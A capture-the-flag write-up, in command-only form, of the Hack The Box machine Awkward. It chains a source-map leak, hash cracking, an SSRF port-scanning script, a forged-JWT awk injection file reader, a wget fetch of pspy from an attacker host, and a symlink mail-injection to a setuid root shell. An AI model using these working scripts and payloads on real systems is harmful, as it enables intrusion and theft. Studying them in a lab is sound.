---
title: "Awkward — Speedrun"
summary: "The command chain only. Source map to staff API, cracked hash to HR, SSRF to internal docs, forged JWT into awk for file read, home backup to SSH, symlinked cart write to root."
date: 2026-09-08
draft: false
tier: speedrun
categories:
  - Offensive
tags:
  - Awkward
  - Hack The Box
  - Linux
  - Web
  - SSRF
  - JWT
  - Argument Injection
ShowToc: true
TocOpen: false
---

Commands and output, one line per step. The reasoning, the dead ends, and why each pivot was chosen are in the [long version]({{< relref "/work/writeups/offensive/awkward" >}}).

I used a hint and a writeup on this box, and followed the privilege escalation walkthrough step for step. Claude helped with the concurrent SSRF scanner. Commands below are formatted from my June notes rather than a fresh replay.

Target: `<target>`, attacker: `<attacker-ip>`. My notes never recorded either address.

## Recon

```bash
nmap -p- --min-rate 10000 -T4 -oA nmap/allports <target>
nmap -sC -sV -p 22,80 -oA nmap/detail <target>
```

Two ports answer: 22 running OpenSSH and 80 running nginx. My notes kept no scan output, so there is none to paste.

```bash
echo "<target> hat-valley.htb" | sudo tee -a /etc/hosts
```

```bash
gobuster vhost -u http://hat-valley.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
```

`store.hat-valley.htb` answers with an HTTP Basic prompt.

## Foothold

**1. Recover the client source from the deployed source map.** DevTools, Sources tab, `webpack://` tree. Without a browser:

```bash
tail -c 300 app.<hash>.js | grep sourceMappingURL
wget http://hat-valley.htb/static/js/app.<hash>.js.map
npx unmap app.<hash>.js.map -o ./src_reconstructed
```

`src/router/router.js` gives `/hr`, unlinked and not marked `requiresAuth`. `src/services/staff.js` gives `/api/staff-details`.

**2. Drop the `Cookie` header.** A `token=guest` placeholder fails parsing; no cookie skips the check entirely.

```http
GET /api/staff-details HTTP/1.1
Host: hat-valley.htb

```

```json
[{"user_id":1,"username":"christine.wool","password":"6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649","fullname":"Christine Wool","role":"Founder, CEO","phone":"0415202922"},{"user_id":2,"username":"christopher.jones","password":"e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1","fullname":"Christopher Jones","role":"Salesperson","phone":"0456980001"},{"user_id":3,"username":"jackson.lightheart","password":"b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436","fullname":"Jackson Lightheart","role":"Salesperson","phone":"0419444111"},{"user_id":4,"username":"bean.hill","password":"37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f","fullname":"Bean Hill","role":"System Administrator","phone":"0432339177"}]
```

**3. Crack the staff hashes.** Bare 64-hex, no `$` prefix, so raw SHA-256 is mode 1400.

```bash
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt
# e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:chris123
```

`christopher.jones:chris123` logs into `/hr`.

**4. SSRF in the store status widget.**

```http
GET /api/store-status?url=http://localhost
```

Returns the Hat Valley landing page HTML.

**5. Sweep localhost through it.** A closed port returns 200 with an empty body, so body length is the oracle.

```python
import requests
from concurrent.futures import ThreadPoolExecutor


def scan(port):
    try:
        r = requests.get(
            f"http://hat-valley.htb/api/store-status?url=http://localhost:{port}",
            timeout=5,
        )
        if len(r.text) > 0:
            print(f"[+] Port {port}: {r.text[:120]}")
    except requests.RequestException:
        pass


with ThreadPoolExecutor(max_workers=50) as pool:
    pool.map(scan, range(1, 65536))
```

Ports 80, 3002, and 8080 answer. Render 3002 in Burp: it is the API's own documentation, listing every route with its implementation.

**6. Two things off the documentation page.** Tokens are HS256, and `/api/all-leave` builds this:

```javascript
exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr)
```

`user` is the `username` claim from the caller's own JWT.

**7. Crack the signing secret** against the real token from the `/hr` session cookie.

```bash
echo "<jwt from the /hr session cookie>" > token.txt
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
# 123beany123
```

**8. Argument injection into `awk`.** Set `username` to:

```text
/' /etc/passwd '/dud
```

The assembled line becomes:

```bash
awk '//' /etc/passwd '/dud/' /var/www/private/leave_requests.csv
```

`//` matches every line, `/etc/passwd` becomes the first input file, and the nonexistent `/dud/` stops awk before it reaches the CSV.

**9. Read files with a minted token.** `read_file.py`:

```python
#!/usr/bin/env python3
import sys

import jwt
import requests

SECRET = "123beany123"
TARGET = "http://hat-valley.htb/api/all-leave"


def read_file(path, outfile=None):
    payload = f"/' {path} '/dud"
    token = jwt.encode(
        {"username": payload, "iat": "1781208275"},
        SECRET,
        algorithm="HS256",
    )
    response = requests.get(TARGET, cookies={"token": token}, timeout=60)
    if outfile:
        with open(outfile, "wb") as output:
            output.write(response.content)
        print(f"[+] wrote {len(response.content)} bytes to {outfile}")
    else:
        print(response.text)


if __name__ == "__main__":
    read_file(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else None)
```

**10. Follow the files to a backup.**

```bash
python3 read_file.py /etc/passwd          # bean and christine have shells
python3 read_file.py /home/bean/.bashrc   # alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'
python3 read_file.py /home/bean/Documents/backup_home.sh
```

The script tars bean's home, then tars that archive again into `/home/bean/Documents/backup/bean_backup_final.tar.gz`.

**11. Pull the archive as bytes and extract twice.** The second argument switches the script to `response.content`.

```bash
python3 read_file.py /home/bean/Documents/backup/bean_backup_final.tar.gz bean_backup_final.tar.gz
mkdir bean-backup && cd bean-backup
mv ../bean_backup_final.tar.gz ./
tar -xvf bean_backup_final.tar.gz    # reports errors, still writes the inner archive
tar -xvf bean_backup.tar.gz
cat .config/xpad/content-DS1ZS1
```

```text
bean.hill:014mrbeanrules!#P
```

```bash
ssh bean@hat-valley.htb
cat ~/user.txt
```

## Privilege escalation

**12. Watch what root does after a leave request.** `sudo -l`, the SUID sweep, and `getcap -r /` are empty.

```bash
# attacker
python3 -m http.server 8000

# target
cd /tmp && wget http://<attacker-ip>:8000/pspy64 && chmod +x pspy64 && ./pspy64
```

Submit a leave request through `/hr`. Root activity follows immediately: `notify.sh`, a `chown`, and `mail -s "Leave Request: <username>" christine`.

**13. Open the store with bean's password.**

```bash
cat /etc/nginx/conf.d/.htpasswd
# admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
```

`admin:014mrbeanrules!#P` works.

**14. The write primitive** in `/var/www/store/cart_actions.php`. Shown as flow rather than as captured PHP; I reconstructed this excerpt rather than capturing it.

```text
product-details/<item>.txt, line 2
    -> append to cart/<user>
    -> follow a symlink to /var/www/private/leave_requests.csv
```

Both parameters are denylisted, `!` included. The denylist never runs against the file contents, so the payload arrives as data. `>>` follows symlinks.

**15. Stage the payload.**

```bash
echo -e '***Hat Valley Product***\npwned --exec='"'"'!/tmp/executeme.sh'"'"'' \
  > /var/www/store/product-details/4.txt

cat > /tmp/executeme.sh <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
chmod +x /tmp/executeme.sh

ln -s /var/www/private/leave_requests.csv /var/www/store/cart/fakecart
```

**16. Fire it** from the authenticated store session.

```http
POST /cart_actions.php HTTP/1.1
Host: store.hat-valley.htb
Authorization: Basic <base64 of admin:014mrbeanrules!#P>
Content-Type: application/x-www-form-urlencoded

action=add_item&item=4&user=fakecart
```

**17. Collect.** `-p` stops bash dropping the effective UID.

```bash
/tmp/rootbash -p
id
# uid=1000(bean) gid=1000(bean) euid=0(root) egid=0(root)
cat /root/root.txt
```

## Chain summary

1. Production source maps are deployed; DevTools reconstructs the Vue source tree.
2. `src/router/router.js` gives the unlinked `/hr` route; `src/services/staff.js` gives `/api/staff-details`.
3. The auth guard only runs when a token is present, so a request with no `Cookie` header returns the staff table.
4. Staff passwords are unsalted SHA-256; `christopher.jones` cracks to `chris123` and opens `/hr`.
5. `/api/store-status?url=` fetches any URL the caller supplies.
6. Empty response bodies mark closed ports, so a body-length filter sweeps localhost and finds 3002.
7. Port 3002 serves the API documentation: HS256 tokens, and the `username` claim concatenated into an `awk` command line.
8. Hashcat mode 16500 recovers the signing secret `123beany123` from the `/hr` token.
9. A `username` of `/' /etc/passwd '/dud` rewrites the awk operands into an arbitrary file read.
10. `/home/bean/.bashrc` names a backup script; the script names a tarball of bean's whole home directory.
11. Fetching that tarball as raw bytes and extracting twice yields an xpad note holding `bean.hill:014mrbeanrules!#P`.
12. SSH as bean; pspy shows root running `notify.sh` and `mail` immediately after a leave request.
13. `/etc/nginx/conf.d/.htpasswd` names the store's `admin` account, and bean's password is reused for it.
14. `cart_actions.php` appends line 2 of an attacker-named product file into an attacker-named cart file, with the denylist covering only the parameters.
15. A symlink from `cart/fakecart` to the leave-request CSV redirects that append into a file bean cannot write.
16. Root's notifier reads the injected username, `--exec` parses as a `mail` option, and `!/tmp/executeme.sh` runs as root.
17. `/tmp/rootbash -p` gives root.
